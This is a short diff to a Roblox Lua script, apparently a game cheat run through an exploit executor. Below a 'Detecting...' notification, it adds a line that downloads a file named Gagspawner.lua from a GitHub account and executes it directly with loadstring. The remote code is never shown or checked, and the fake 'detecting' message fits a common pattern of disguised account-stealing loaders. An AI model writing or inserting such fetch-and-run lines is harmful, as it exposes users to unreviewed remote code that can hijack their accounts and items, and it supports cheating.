@@ -5,3 +5,4 @@ game.StarterGui:SetCore("SendNotification", {
     Text = "Detecting...",
     Duration = 6
 })
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/bf7c9cf7e6d1d553aa8f58fe842fbe1824fd3827/Gagspawner.lua"))()
